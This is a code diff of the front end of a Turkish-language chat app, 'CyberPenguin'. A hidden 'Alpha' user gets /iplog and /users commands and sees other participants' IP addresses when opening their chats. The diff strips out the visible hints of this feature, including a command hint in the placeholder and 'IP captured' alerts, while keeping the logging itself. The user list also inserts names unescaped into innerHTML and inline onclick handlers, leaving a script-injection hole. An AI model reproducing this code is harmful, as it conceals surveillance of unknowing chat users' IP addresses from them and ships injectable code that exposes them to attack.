@@ -5,11 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>CyberPenguin Chat</title>
   <style>
-    /* ===== RESET ===== */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body { height: 100%; overflow: hidden; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #0a0e14; color: #00ffcc; }
 
-    /* ===== LOGIN ===== */
     #login {
       display: flex; flex-direction: column; gap: 12px;
       padding: 30px 20px; background: #0f161e; border-radius: 24px;
@@ -30,7 +28,6 @@
     }
     #login button:hover { background: #66ffdd; }
 
-    /* ===== APP ===== */
     .app {
       width: 100%; max-width: 1000px; height: 100vh; max-height: 750px;
       background: #0f161e; display: flex; overflow: hidden;
@@ -42,7 +39,6 @@
       .app { border-radius: 28px; height: 92vh; }
     }
 
-    /* ===== SIDEBAR ===== */
     .sidebar {
       width: 260px; background: #141c24; border-right: 1px solid #00ffcc33;
       display: flex; flex-direction: column; flex-shrink: 0; height: 100%;
@@ -74,7 +70,6 @@
       border-radius: 20px; margin-left: auto;
     }
 
-    /* ===== CHAT ===== */
     .chat {
       flex: 1; display: flex; flex-direction: column; min-width: 0; height: 100%;
     }
@@ -136,7 +131,6 @@
 
     .hidden { display: none !important; }
 
-    /* ===== MOBİL ===== */
     @media (max-width: 600px) {
       .app { max-height: 100vh; height: 100vh; border-radius: 0; flex-direction: column; }
       .sidebar { width: 100%; height: auto; max-height: 35%; border-right: none; border-bottom: 1px solid #00ffcc33; }
@@ -165,14 +159,12 @@
 </head>
 <body>
 
-  <!-- LOGIN -->
   <div id="login">
     <h1>🐧 Cyber<span>Penguin</span></h1>
     <input id="usernameInput" placeholder="Takma adın ne olsun?" autofocus />
     <button id="joinBtn">Sohbete Başla</button>
   </div>
 
-  <!-- APP -->
   <div class="app hidden" id="app">
     <div class="sidebar" id="sidebar">
       <div class="sidebar-header">🐧 Katılımcılar <span id="userCount"></span></div>
@@ -189,7 +181,7 @@
       </div>
       <div class="chat-messages" id="messages"></div>
       <div class="chat-footer" id="chatFooter">
-        <input id="input" placeholder="Mesaj yaz... (Alpha: /iplog, /users)" />
+        <input id="input" placeholder="Mesaj yaz..." />
         <button id="sendBtn">Gönder</button>
       </div>
     </div>
@@ -207,7 +199,6 @@
       const userList = document.getElementById('userList');
       const userCount = document.getElementById('userCount');
       const messages = document.getElementById('messages');
-      const chatHeader = document.getElementById('chatHeader');
       const chatName = document.getElementById('chatName');
       const chatStatus = document.getElementById('chatStatus');
       const chatFooter = document.getElementById('chatFooter');
@@ -216,11 +207,9 @@
 
       let username = '';
       let currentChatId = null;
-      let currentChatName = 'CyberPenguin';
       let isAlpha = false;
       let allUsers = {};
 
-      // ===== GİRİŞ =====
       joinBtn.onclick = () => {
         const val = usernameInput.value.trim();
         if (val) {
@@ -234,16 +223,11 @@
           chatStatus.textContent = 'çevrimiçi';
           chatFooter.classList.remove('hidden');
           currentChatId = 'CyberPenguin';
-          currentChatName = 'CyberPenguin';
           document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
-          if (isAlpha) {
-            addSystemMessage('👑 Alpha hoş geldin. Tüm IP\'ler senin amk.');
-          }
         }
       };
       usernameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') joinBtn.click(); });
 
-      // ===== MESAJ FONKSİYONLARI =====
       function addMessage(text, type = '') {
         const div = document.createElement('div');
         div.className = 'message';
@@ -273,7 +257,6 @@
         const msg = input.value.trim();
         if (!msg || !currentChatId) return;
 
-        // ===== ALPHA KOMUTLARI =====
         if (isAlpha && msg.startsWith('/')) {
           const cmd = msg.slice(1).trim();
           if (cmd === 'iplog') {
@@ -287,14 +270,13 @@
             input.focus();
             return;
           } else {
-            addSystemMessage('Bilinmeyen komut amk. /iplog veya /users');
+            addSystemMessage('Bilinmeyen komut.');
             input.value = '';
             input.focus();
             return;
           }
         }
 
-        // Normal mesaj
         if (currentChatId === 'CyberPenguin') {
           socket.emit('private message', { to: 'CyberPenguin', msg });
         } else {
@@ -310,7 +292,6 @@
       sendBtn.onclick = sendMessage;
       input.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendMessage(); });
 
-      // ===== SOCKET =====
       socket.on('user list', (users) => {
         allUsers = {};
         users.forEach(u => { allUsers[u.id] = u; });
@@ -322,9 +303,6 @@
         allUsers[user.id] = user;
         renderUserList(Object.values(allUsers));
         userCount.textContent = `(${Object.keys(allUsers).length})`;
-        if (isAlpha) {
-          addSystemMessage(`📡 Yeni IP yakalandı: ${user.name} -> ${user.ip || 'gizli'}`);
-        }
       });
 
       socket.on('user left', (id) => {
@@ -360,7 +338,6 @@
         }
       });
 
-      // ===== ADMIN YANITLARI =====
       socket.on('admin iplog response', (data) => {
         addIPLog(`📋 IP LOG:\n${data}`);
       });
@@ -374,7 +351,6 @@
         addIPLog(text);
       });
 
-      // ===== RENDER =====
       function renderUserList(users) {
         userList.innerHTML = users.map(u => `
           <div class="user-item ${currentChatId === u.id ? 'active' : ''}" data-id="${u.id}" onclick="window.openChat('${u.id}', '${u.name}')">
@@ -387,7 +363,6 @@
 
       window.openChat = (id, name) => {
         currentChatId = id;
-        currentChatName = name;
         messages.innerHTML = '';
         chatName.textContent = name;
         chatStatus.textContent = 'çevrimiçi';
@@ -396,7 +371,6 @@
         const active = document.querySelector(`.user-item[data-id="${id}"]`);
         if (active) active.classList.add('active');
         input.focus();
-        // Sohbet açıldı mesajı
         if (isAlpha && allUsers[id] && allUsers[id].ip) {
           addSystemMessage(`📡 ${name} - IP: ${allUsers[id].ip}`);
         }
